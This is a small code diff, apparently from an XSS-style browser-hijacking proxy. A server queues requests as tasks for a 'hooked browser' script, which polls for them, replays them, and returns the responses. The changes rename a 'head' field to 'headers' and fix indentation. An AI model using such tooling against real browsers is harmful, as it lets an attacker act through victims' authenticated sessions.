@@ -74,7 +74,7 @@ proxy.createServer(function (req, res) {
             /* Sends a task to the hooked browser. */
             var buffer = Buffer.concat(data);
             var body = buffer.toString('utf8');
-            var new_task = {"id": task_counter++, "method": req.method, "url": req.url, "head": req.headers, "body": body}
+            var new_task = {"id": task_counter++, "method": req.method, "url": req.url, "headers": req.headers, "body": body}
             tasks_pending.push(new_task);
             
             /* Handles the response from the task given to the hooked browser. */
@@ -108,7 +108,7 @@ proxy.createServer(function (req, res) {
         });
     } else {
         /* Sends a task to the hooked browser. */
-        var new_task = {"id": task_counter++, "method": req.method, "url": req.url, "head": req.headers, "body": null}
+        var new_task = {"id": task_counter++, "method": req.method, "url": req.url, "headers": req.headers, "body": null}
         tasks_pending.push(new_task);
     
         /* Handles the response from the task given to the hooked browser. */
@@ -131,10 +131,10 @@ proxy.createServer(function (req, res) {
             var body_length = body.length;
             var headers = updateContentLength(headers, body_length);
 
-	        console.log("[+] Received status: " + result.status);
-	        if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
-	        if (config.debug) { console.log("[+] Received body:\n" + body); }
-	        console.log("[+] -------------------------------- [+]");
+            console.log("[+] Received status: " + result.status);
+            if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
+            if (config.debug) { console.log("[+] Received body:\n" + body); }
+            console.log("[+] -------------------------------- [+]");
 
             res.writeHead(result.status, headers);
             res.end(body);
@@ -348,7 +348,7 @@ function poll() {
             var tasks = JSON.parse(mygg_http.responseText);
             for (var i in tasks){
                 console.log("New task"); console.log(tasks[i]);
-                makeRequest(tasks[i].id, tasks[i].method, tasks[i].url, tasks[i].head, tasks[i].body);
+                makeRequest(tasks[i].id, tasks[i].method, tasks[i].url, tasks[i].headers, tasks[i].body);
             }
         }
     };
